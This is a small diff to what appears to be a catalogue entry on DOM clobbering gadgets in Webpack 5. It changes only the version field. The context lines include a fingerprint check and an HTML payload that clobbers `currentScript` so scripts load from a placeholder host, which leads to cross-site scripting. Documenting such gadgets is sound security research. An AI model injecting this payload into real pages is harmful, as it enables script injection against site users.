@@ -3,7 +3,7 @@
 ### Meta
 
 + Library: Webpack
-+ Version: 5
++ Version: 5.x.x
 + Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
 + Impact: XSS
